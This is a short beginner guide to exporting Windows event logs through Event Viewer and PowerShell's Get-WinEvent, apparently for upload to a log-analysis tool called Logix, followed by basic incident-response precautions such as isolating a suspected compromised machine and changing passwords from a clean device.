---------------------------- USER GUIDE: How to export Windows logs (for beginners) ----------------------------
1) Using Event Viewer (GUI):
   - Press Windows key, type 'Event Viewer' and open it.
   - In left panel expand 'Windows Logs' and select one (Application, Security, System).
   - On the right 'Actions' pane click 'Save All Events As...'
   - Save as .evtx (recommended). To use with Logix, open PowerShell and run:
       Get-WinEvent -Path C:\path\to\your.evtx | Format-List | Out-File -FilePath C:\path\to\exported.txt -Encoding utf8

2) Using PowerShell (fast):
   - Example (export last day's system events to text):
       Get-WinEvent -FilterHashtable @{LogName='System'; StartTime=(Get-Date).AddDays(-1)} | Format-List | Out-File -FilePath C:\path\to\system_lastday.txt -Encoding utf8

3) If you cannot use EVTX:
   - Copy the log text from tools / console and save as .txt, then upload.

Precautions:
 - Do not upload full disk images; only export text/event logs.
 - If you suspect compromise, isolate the machine before exporting logs.
 - Share reports only with trusted responders.
---------------------------------------------------------------------------------------------------------------

IMMEDIATE PRECAUTIONS:
- If a compromise is suspected: disconnect the device from the network immediately.
- Preserve evidence: do not reboot the host if possible; collect logs/images only by trained personnel.
- Change passwords for affected accounts from a separate clean device.
